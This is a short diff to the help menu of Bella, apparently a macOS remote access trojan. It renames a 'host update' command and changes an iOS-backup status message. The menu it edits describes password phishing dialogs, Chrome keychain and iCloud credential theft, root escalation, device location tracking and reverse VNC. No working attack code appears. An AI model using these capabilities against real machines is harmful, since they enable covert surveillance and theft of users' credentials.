@@ -1124,7 +1124,6 @@ def manual():
 	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
 	value += "\n%sCurrent Users%s\nFind all currently logged in users.\nUsage: %scurrent_Users%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sGet Root%s\nAttempt to escalate Bella to root through a variety of attack vectors.\nUsage: %sget_root%s\nRequirements: None\n" % (underline + bold + red, endANSI, bold, endANSI)
-	value += "\n%sHost Update%s\nUpdate the remote Bella server with a specified payload.\nUsage: %shost_update%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sFind my iPhone%s\nLocate all devices on the user's iCloud account.\nUsage: %siCloud_FMIP%s\nRequirements: iCloud Password [see iCloud_phish]\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sFind my Friends%s\nLocate all shared devices on the user's iCloud account.\nUsage: %siCloud_FMF%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%siCloud Contacts%s\nGet contacts from the user's iCloud account.\nUsage: %siCloud_contacts%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
@@ -1149,6 +1148,7 @@ def manual():
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUpdate DB Entry%s\nUpdate the database entry for iCloud password or user password.\nUsage: %supdate_db_entry%s\nRequirements: None.\n" % (underline + bold + blue, endANSI, bold, endANSI)
+	value += "\n%sUpdate Server%s\nUpdate the remote Bella server with a specified payload.\nUsage: %sserver_update%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sVolume Set%s\nSet the speaker volume on the remote machine.\nUsage: %svolume%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sVNC%s\nStart a reverse VNC connection over port 5500.\nUsage: %svnc%s\nRequirements: VNC Viewer for macOS.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
@@ -1456,7 +1456,7 @@ def bella_info():
 	iOSbackups = iTunes_backup_looker()
 
 	if iOSbackups[1]:
-		send_msg("%siOS backups are present and ready to be processed. [%s]\n" % (greenPlus, iOSbackups[2]), False)
+		send_msg("%siOS backups are present and ready to be processed. [%s]\n" % (greenPlus, len(iOSbackups[2])), False)
 	else:
 		send_msg("%sNo iOS backups are present.\n" % red_minus, False)
 
